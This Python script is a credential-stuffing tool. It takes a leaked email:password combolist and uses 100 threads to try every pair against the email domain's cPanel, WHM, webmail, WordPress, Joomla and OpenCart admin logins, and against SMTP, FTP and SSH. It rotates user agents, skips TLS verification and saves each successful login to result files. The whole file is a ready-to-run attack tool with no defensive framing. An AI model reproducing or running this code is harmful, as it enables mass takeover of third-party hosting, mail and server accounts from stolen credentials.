import sys
import requests
import os
import concurrent.futures
from colorama import Fore, init
import re
from ftplib import FTP, error_perm
import smtplib
import paramiko
import random
from lib.tools.utils import banner, clear
from lib.tools.colors import wh, r, g

# Initialize colorama
init(autoreset=True)

# Create 'Result' directory if it doesn't exist
os.makedirs('Result', exist_ok=True)

class BruteForceTool:
    def __init__(self):
        # Color definitions
        self.colors = {
            'red': Fore.RED,
            'cyan': Fore.CYAN,
            'white': Fore.WHITE,
            'green': Fore.GREEN,
            'magenta': Fore.MAGENTA,
            'yellow': Fore.YELLOW,
            'blue': Fore.BLUE,
            'reset': Fore.RESET
        }
        # Disable warnings
        requests.packages.urllib3.disable_warnings()

    def URLdomain_luv(self, site):
        site = site.replace("http://", "").replace("https://", "").replace("www.", "")
        return site.split('/')[0].strip()

    def get_random_user_agent(self):
        try:
            with open('lib/files/user-agent.txt', 'r', encoding='utf-8') as f:
                user_agents = [line.strip() for line in f if line.strip()]
            if user_agents:
                return random.choice(user_agents)
            else:
                return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        except FileNotFoundError:
            print(f"{self.colors['red']}[!] User-agent file not found: lib/files/random_agen.txt")
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'


    def perform_login(self, url, payload, success_keywords, result_file, user, pwd):
        try:
            headers = {"User-Agent": self.get_random_user_agent()}  # Use random user-agent
            response = requests.post(url, data=payload, headers=headers, verify=False, timeout=15)
            if any(keyword in response.text for keyword in success_keywords):
                print(f"{self.colors['green']}[GOTCHAA!!!!] {url}|{user}|{pwd}")
                with open(result_file, 'a') as file:
                    file.write(f"{url}@{user}#{pwd}\n")
            else:
                print(f"{self.colors['red']}[SADLY] {url}|{user}|{pwd}")
        except requests.RequestException:
            print(f"{self.colors['red']}[Error] Connection failed: {url}")

    def check_smtp(self, email, pwd, domain):
        try:
            smtp_server = f"mail.{domain}"  # Adjust this as necessary for specific domains
            port = 587  # Common SMTP port for TLS
            with smtplib.SMTP(smtp_server, port, timeout=10) as server:
                server.starttls()
                server.login(email, pwd)
                print(f"{self.colors['green']}[GOTCHAA!!!!] SMTP Login Successful: {email}|{pwd}")
                with open('Result/SMTP.txt', 'a') as file:
                    file.write(f"{email}|{pwd}\n")
        except smtplib.SMTPAuthenticationError:
            print(f"{self.colors['red']}[SADLY] SMTP Authentication Failed: {email}|{pwd}")
        except Exception as e:
            print(f"{self.colors['red']}[Error] {e}")

    def check_cpanel(self, email, pwd):
        domain = self.URLdomain_luv(email.split('@')[1])
        user = email.split('@')[0]
        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
        self.perform_login(f'https://{domain}:2083/login/', payload, ['lblDomainName', 'email_accounts'], 'Result/cPanels.txt', user, pwd)

    def check_wehaem(self, email, pwd):
        domain = self.URLdomain_luv(email.split('@')[1])
        user = email.split('@')[0]
        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
        self.perform_login(f'https://{domain}:2087/login/', payload, ['Top Tools', 'Hostname'], 'Result/WHM.txt', user, pwd)

    def check_webmail(self, email, pwd):
        domain = self.URLdomain_luv(email.split('@')[1])
        user = email.split('@')[0]
        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
        self.perform_login(f'https://{domain}:2096/login/', payload, ['id_autoresponders'], 'Result/Wemail.txt', user, pwd)

    def check_wp_credentials(self, email, password, domain):
        url = f"https://{domain}/wp-login.php"
        payload = {"log": email, "pwd": password}
        # Attempt login with full email
        self.perform_login(url, payload, ["wpwrap"], "Result/Wordpress.txt", email, password)
        # Attempt login with only username
        username = email.split('@')[0]
        payload['log'] = username
        self.perform_login(url, payload, ["wpwrap"], "Result/Wordpress.txt", username, password)

    def check_joomla_credentials(self, email, password, domain):
        url = f"https://{domain}/administrator/index.php"
        payload = {"username": email.split('@')[0], "passwd": password, "task": "login", "submit": "Login"}
        # Attempt login with only username
        username = email.split('@')[0]
        payload['username'] = username
        self.perform_login(url, payload, ["control panel"], "Result/Joomla.txt", username, password)

    def check_opencart_credentials(self, email, password, domain):
        url = f"https://{domain}/admin/index.php"
        payload = {"username": email.split('@')[0], "password": password}
        # Attempt login with username
        username = email.split('@')[0]
        payload['username'] = username
        self.perform_login(url, payload, ["common/logout"], "Result/OpenCart.txt", username, password)

    def check_ftp(self, email, pwd, domain):
        try:
            ftp_server = domain
            ftp = FTP(ftp_server, timeout=10)
            ftp.login(user=email.split('@')[0], passwd=pwd)  # Use only username part of the email
            print(f"{self.colors['green']}[GOTCHAA!!!!] FTP Login Successful: {email}|{pwd}")
            with open('Result/FTP.txt', 'a') as file:
                file.write(f"[+] URLs: {domain}\n[+] Username: {email}\n[+] Password: {pwd}\n\n")
            ftp.quit()
        except error_perm:
            print(f"{self.colors['red']}[SADLY] FTP Authentication Failed: {email}|{pwd}")
        except Exception as e:
            print(f"{self.colors['red']}[Error] {e}")

    def check_ssh(self, email, pwd, domain):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(domain, username=email.split('@')[0], password=pwd, timeout=10)
            print(f"{self.colors['green']}[GOTCHAA!!!!] SSH Login Successful: {email}|{pwd}")
            with open('Result/SSH.txt', 'a') as file:
                file.write(f"{domain}@{email}#{pwd}\n")
            ssh.close()
        except paramiko.AuthenticationException:
            print(f"{self.colors['red']}[SADLY] SSH Authentication Failed: {email}|{pwd}")
        except Exception as e:
            print(f"{self.colors['red']}[Error] {e}")

    def check_other_services(self, email, pwd, domain):
        self.check_cpanel(email, pwd)
        self.check_wehaem(email, pwd)
        self.check_webmail(email, pwd)
        self.check_wp_credentials(email, pwd, domain)
        self.check_joomla_credentials(email, pwd, domain)
        self.check_opencart_credentials(email, pwd, domain)
        self.check_smtp(email, pwd, domain)
        self.check_ftp(email, pwd, domain)
        self.check_ssh(email, pwd, domain)

    def read_combolist(self, file_name):
        combolist = []
        try:
            with open(file_name, "r", encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        email, password = line.split(":", 1)
                        domain = re.search("@(.*)", email)
                        if domain:
                            domain = domain.group(1)
                            if domain not in ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "yahoo.co.id"]:
                                combolist.append((email, password, domain))
                        else:
                            print(f"{self.colors['red']}Error: Email '{email}' does not have a valid domain.")
                    else:
                        print(f"{self.colors['red']}Error: Line '{line}' does not have the correct format.")
        except Exception as e:
            print(f"{self.colors['red']}Error: {e}")
        return combolist

    def run_checks(self, email, password, domain):
        self.check_other_services(email, password, domain)

    def brute_force(self, combolist, thread_count):
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(self.run_checks, email, password, domain) for email, password, domain in combolist]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{self.colors['red']}[!] Error: {e}")

    def cker(self):
        clear()
        print(banner)
        print(f"{wh}[{g}+{wh}] Combolist Checker for CPANEL - WEBMAIL - SSH - WP PANEL - WHM - SMTP - FTP - JOOMLA - OPENCART\n")
        target_file = sys.argv[1] if len(sys.argv) > 1 else input(f"{wh}[{g}+{wh}] Input Combolist => ")

        if not os.path.isfile(target_file):
            print(f"{wh}[{r}!{wh}] File '{target_file}' does not exist!")
            sys.exit(1)

        combolist = self.read_combolist(target_file)
        self.brute_force(combolist, 100)

if __name__ == "__main__":
    brute_force_tool = BruteForceTool()
    brute_force_tool.cker()
